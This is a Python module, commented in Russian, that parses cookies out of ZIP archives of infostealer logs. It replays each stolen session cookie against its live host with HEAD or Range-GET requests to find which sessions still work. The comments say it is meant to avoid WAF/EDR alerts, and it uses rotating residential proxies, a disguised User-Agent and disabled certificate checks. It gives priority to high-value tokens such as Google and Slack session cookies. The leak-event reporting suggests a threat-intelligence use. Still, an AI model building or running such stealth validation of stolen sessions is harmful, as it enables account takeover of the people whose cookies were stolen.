"""Валидатор активности session cookies из стилер-логов (задача 9.C).

Уникальная конкурентная фича: проверяет живы ли украденные сессионные токены,
без генерации алертов на стороне WAF/EDR жертвы.

Метод: пассивный HEAD-запрос с куки. WAF не реагирует на HEAD без тела.
Признак живой сессии — ответ 200/204 или redirect НЕ на страницу логина.
"""
import json
import logging
import os
import random
import re
import socket
import zipfile
from pathlib import Path
from typing import Generator

import httpx

from tasks.bulk_ingest import bulk_ingest

logger = logging.getLogger(__name__)

# Таймаут пассивного HEAD-запроса (секунды).
_HEAD_TIMEOUT = 8

# Паттерны URL страниц логина (редирект туда = сессия мертва)
_LOGIN_PATTERNS: list[str] = [
    "/login", "/signin", "/sign-in", "/auth", "/account/login",
    "login.microsoftonline.com", "accounts.google.com",
    "login.live.com", "auth.atlassian.com", "sso.jumpcloud.com",
    "okta.com/login", "/saml/login", "/oauth/authorize",
]

# Ценные куки-сессии (высокий приоритет — проверяем вне зависимости от домена)
_HIGH_VALUE_NAMES: frozenset[str] = frozenset({
    "session", "sessionid", "auth_token", "access_token",
    "PHPSESSID", "JSESSIONID", "ASP.NET_SessionId",
    "cf_clearance", "saml_token", "sso_token",
    "__Secure-3PSID",   # Google
    "d",                # Slack workspace token
    "x-auth-token",
    "Authorization",
    "remember_me", "rememberme",
    "token", "jwt",
})

# Нейтральный User-Agent, не выглядит как ботнет
_USER_AGENT = "Mozilla/5.0 (compatible; security-monitor/1.0)"

# Маска для cookie-значений в payload событий
_MASK_MIN_LEN = 12

# Ротация residential-прокси: COOKIE_PROXY_LIST=http://u:p@host:port,http://...
_PROXY_LIST: list[str] = [
    p.strip() for p in os.environ.get("COOKIE_PROXY_LIST", "").split(",") if p.strip()
]


def _pick_proxy() -> str | None:
    """Случайный прокси из списка или None если список пустой."""
    return random.choice(_PROXY_LIST) if _PROXY_LIST else None


# ──────────────────────────────────────────────
# Парсеры форматов
# ──────────────────────────────────────────────

def _parse_netscape_cookies(text: str) -> list[dict]:
    """
    Парсит файл кук в формате Netscape HTTP Cookie File.

    Формат строки (tab-separated):
        host TAB subdomains TAB path TAB secure TAB expiry TAB name TAB value
    Строки начинающиеся с '#' пропускаются (комментарии и заголовок).
    Возвращает list[dict] с ключами: host, name, value, path, expiry, secure.
    """
    result: list[dict] = []
    for line in text.splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        parts = line.split("\t")
        if len(parts) < 7:
            continue
        host, _include_subdomains, path, secure_flag, expiry_str, name, value = parts[:7]
        try:
            expiry = int(expiry_str)
        except (ValueError, TypeError):
            expiry = 0
        result.append({
            "host": host.strip(),
            "name": name.strip(),
            "value": value.strip(),
            "path": path.strip() or "/",
            "expiry": expiry,
            "secure": secure_flag.strip().upper() == "TRUE",
        })
    return result


def _parse_json_cookies(text: str) -> list[dict]:
    """
    Парсит куки в JSON-формате (массив объектов).

    Нормализует разные имена ключей:
      - 'domain' → 'host'
      - 'expirationDate' → 'expiry'
    При ошибке парсинга возвращает [].
    """
    try:
        raw = json.loads(text)
    except (json.JSONDecodeError, ValueError):
        return []

    if not isinstance(raw, list):
        return []

    result: list[dict] = []
    for item in raw:
        if not isinstance(item, dict):
            continue
        # Нормализация ключей от разных браузеров/стилеров
        host = item.get("host") or item.get("domain") or ""
        expiry_raw = item.get("expiry") or item.get("expirationDate") or 0
        try:
            expiry = int(float(expiry_raw))
        except (ValueError, TypeError):
            expiry = 0
        name = item.get("name", "")
        value = item.get("value", "")
        if not name or not host:
            continue
        result.append({
            "host": str(host).strip(),
            "name": str(name).strip(),
            "value": str(value).strip(),
            "path": str(item.get("path", "/")).strip() or "/",
            "expiry": expiry,
            "secure": bool(item.get("secure", False) or item.get("httpOnly", False)),
        })
    return result


# ──────────────────────────────────────────────
# Итератор файлов кук из ZIP
# ──────────────────────────────────────────────

def _iter_cookie_files(zip_path: Path) -> Generator[tuple[str, list[dict]], None, None]:
    """
    Генератор: (filename, cookies_list) для каждого cookie-файла внутри ZIP.

    Ищет файлы по признакам:
    - Имя содержит 'cookie' (case-insensitive)
    - Или файл .txt и первые байты содержат "Netscape HTTP Cookie File"
    Пробует parse_netscape, затем parse_json.
    """
    # Паттерн имён cookie-файлов из стилер-логов
    cookie_name_re = re.compile(r"cookie", re.IGNORECASE)

    try:
        with zipfile.ZipFile(zip_path, "r") as zf:
            for member in zf.namelist():
                basename = member.split("/")[-1].split("\\")[-1]
                lower = basename.lower()

                # Пропускаем вложенные ZIP (рекурсия не нужна для MVP)
                if lower.endswith(".zip"):
                    continue

                is_txt_or_json = lower.endswith((".txt", ".json", ".log"))
                has_cookie_name = bool(cookie_name_re.search(basename))

                if not (has_cookie_name or is_txt_or_json):
                    continue

                try:
                    with zf.open(member) as raw:
                        content = raw.read(512 * 1024)  # читаем макс. 512 КБ
                    try:
                        text = content.decode("utf-8", errors="replace")
                    except Exception:
                        continue

                    # Проверяем сигнатуру Netscape-формата
                    is_netscape = "Netscape HTTP Cookie File" in text[:200]

                    if has_cookie_name or is_netscape:
                        cookies = _parse_netscape_cookies(text)
                        if not cookies:
                            cookies = _parse_json_cookies(text)
                        if cookies:
                            yield member, cookies

                except Exception as exc:
                    logger.debug("[cookie_validator] Не удалось прочитать %s: %s", member, exc)

    except zipfile.BadZipFile as exc:
        logger.warning("[cookie_validator] Некорректный ZIP-файл %s: %s", zip_path, exc)
    except Exception as exc:
        logger.error("[cookie_validator] Ошибка открытия ZIP %s: %s", zip_path, exc)


# ──────────────────────────────────────────────
# Пассивная проверка активности сессии
# ──────────────────────────────────────────────

def _is_login_redirect(response: httpx.Response) -> bool:
    """
    Определяет, редирект ли на страницу логина.
    Проверяет заголовок Location на совпадение с известными паттернами.
    """
    location = response.headers.get("location", "").lower()
    if not location:
        return False
    return any(pattern.lower() in location for pattern in _LOGIN_PATTERNS)


def _mask_cookie_value(value: str) -> str:
    """Маскирует значение куки для безопасного хранения в событиях."""
    if len(value) <= _MASK_MIN_LEN:
        return "***"
    return value[:4] + "***" + value[-4:]


def _check_cookie_alive(host: str, name: str, value: str, path: str = "/") -> dict:
    """
    Пассивная проверка активности сессионного токена.

    HEAD-запрос не изменяет состояние сервера и не генерирует алертов в WAF/EDR.
    Никогда не выполняет GET/POST — только HEAD.

    При наличии COOKIE_PROXY_LIST запросы идут через случайный residential-прокси,
    что исключает блокировку по IP дата-центра.

    Возвращает:
        {"alive": bool, "status_code": int, "reason": str}
    """
    # Нормализуем хост: убираем ведущие точки (wildcard-домены)
    clean_host = host.lstrip(".")
    url = f"https://{clean_host}{path}"

    proxy = _pick_proxy()
    proxy_kwargs = {"proxies": {"all://": proxy}} if proxy else {}

    try:
        with httpx.Client(
            timeout=_HEAD_TIMEOUT,
            follow_redirects=False,
            verify=False,  # не блокируем на самоподписанных сертификатах
            **proxy_kwargs,
        ) as client:
            resp = client.head(
                url,
                cookies={name: value},
                headers={"User-Agent": _USER_AGENT},
            )

        sc = resp.status_code

        if sc in (200, 204):
            return {"alive": True, "status_code": sc, "reason": "200_ok"}

        if sc in (301, 302, 303, 307, 308):
            if _is_login_redirect(resp):
                return {"alive": False, "status_code": sc, "reason": "login_redirect"}
            # Редирект не на логин — сессия может быть живой (переход на dashboard и т.п.)
            return {"alive": True, "status_code": sc, "reason": "redirect_non_login"}

        if sc in (401, 403):
            return {"alive": False, "status_code": sc, "reason": "auth_required"}

        if sc == 405:
            # HEAD не поддерживается — пробуем GET с Range:bytes=0-0 (минимальный трафик)
            try:
                with httpx.Client(
                    timeout=_HEAD_TIMEOUT,
                    follow_redirects=False,
                    verify=False,
                    **proxy_kwargs,
                ) as client2:
                    resp2 = client2.get(
                        url,
                        cookies={name: value},
                        headers={"User-Agent": _USER_AGENT, "Range": "bytes=0-0"},
                    )
                sc2 = resp2.status_code
                if sc2 in (200, 204, 206):
                    return {"alive": True, "status_code": sc2, "reason": "get_fallback_ok"}
                if sc2 in (301, 302, 303, 307, 308) and _is_login_redirect(resp2):
                    return {"alive": False, "status_code": sc2, "reason": "login_redirect"}
                if sc2 in (401, 403):
                    return {"alive": False, "status_code": sc2, "reason": "auth_required"}
            except Exception:
                pass

        return {"alive": False, "status_code": sc, "reason": f"status_{sc}"}

    except (httpx.ConnectError, httpx.TimeoutException, socket.gaierror):
        return {"alive": False, "status_code": 0, "reason": "connection_failed"}
    except Exception as exc:
        logger.debug("[cookie_validator] Неожиданная ошибка для %s: %s", host, exc)
        return {"alive": False, "status_code": 0, "reason": "error"}


# ──────────────────────────────────────────────
# Основная функция
# ──────────────────────────────────────────────

def validate_cookies_from_zip(
    zip_path: Path,
    target_domain: str,
    core_api_url: str,
    internal_secret: str,
) -> dict:
    """
    Проверяет активность сессионных кук из стилер-лога.

    Алгоритм:
    1. Итерирует cookie-файлы внутри ZIP.
    2. Фильтрует куки по target_domain ИЛИ по высокоценным именам (_HIGH_VALUE_NAMES).
    3. Для каждой куки выполняет пассивный HEAD-запрос.
    4. Создаёт события:
       - alive=True  → severity=critical, event_type=active_session_leak
       - alive=False + ценное имя → severity=medium, event_type=session_leak
    5. Маскирует значения кук перед записью.
    6. Отправляет батч через bulk_ingest.

    Возвращает: {"checked": N, "alive": M, "dead": K, "sent": J}
    """
    if not zip_path.exists():
        logger.warning("[cookie_validator] ZIP-файл не найден: %s", zip_path)
        return {"checked": 0, "alive": 0, "dead": 0, "sent": 0}

    checked = alive_count = dead_count = 0
    events: list[dict] = []

    for filename, cookies in _iter_cookie_files(zip_path):
        for cookie in cookies:
            host: str = cookie.get("host", "")
            name: str = cookie.get("name", "")
            value: str = cookie.get("value", "")
            path: str = cookie.get("path", "/")

            if not host or not name or not value:
                continue

            # Фильтр: домен совпадает с целевым ИЛИ это ценная куки любого хоста
            host_matches_target = (
                target_domain
                and (
                    target_domain in host
                    or host.lstrip(".").endswith(target_domain)
                )
            )
            is_high_value = name in _HIGH_VALUE_NAMES

            if not host_matches_target and not is_high_value:
                continue

            checked += 1
            result = _check_cookie_alive(host, name, value, path)

            masked_value = _mask_cookie_value(value)

            if result["alive"]:
                alive_count += 1
                events.append({
                    "event_type": "active_session_leak",
                    "severity": "critical",
                    "source_type": "cookie_validator",
                    "source_name": "cookie-validator",
                    "target_domain": target_domain or host.lstrip("."),
                    "payload": {
                        "host": host,
                        "cookie_name": name,
                        "cookie_value_masked": masked_value,
                        "session_alive": True,
                        "http_status": result["status_code"],
                        "check_reason": result["reason"],
                        "zip_source": zip_path.name,
                        "source_file": filename,
                    },
                })
                logger.warning(
                    "[cookie_validator] ЖИВАЯ СЕССИЯ: host=%s name=%s status=%d",
                    host, name, result["status_code"],
                )
            elif is_high_value:
                # Мёртвая, но ценная — среднего приоритета (могла быть активна недавно)
                dead_count += 1
                events.append({
                    "event_type": "session_leak",
                    "severity": "medium",
                    "source_type": "cookie_validator",
                    "source_name": "cookie-validator",
                    "target_domain": target_domain or host.lstrip("."),
                    "payload": {
                        "host": host,
                        "cookie_name": name,
                        "cookie_value_masked": masked_value,
                        "session_alive": False,
                        "http_status": result["status_code"],
                        "check_reason": result["reason"],
                        "zip_source": zip_path.name,
                        "source_file": filename,
                    },
                })
            else:
                dead_count += 1
                logger.debug(
                    "[cookie_validator] Мёртвая сессия: host=%s name=%s reason=%s",
                    host, name, result["reason"],
                )

    sent = 0
    if events:
        bulk_result = bulk_ingest(events, core_api_url, internal_secret)
        sent = bulk_result.get("sent", 0)
        if bulk_result.get("errors", 0):
            logger.warning(
                "[cookie_validator] Ошибки отправки событий: %d", bulk_result["errors"]
            )

    logger.info(
        "[cookie_validator] Итого: checked=%d alive=%d dead=%d sent=%d",
        checked, alive_count, dead_count, sent,
    )
    return {"checked": checked, "alive": alive_count, "dead": dead_count, "sent": sent}
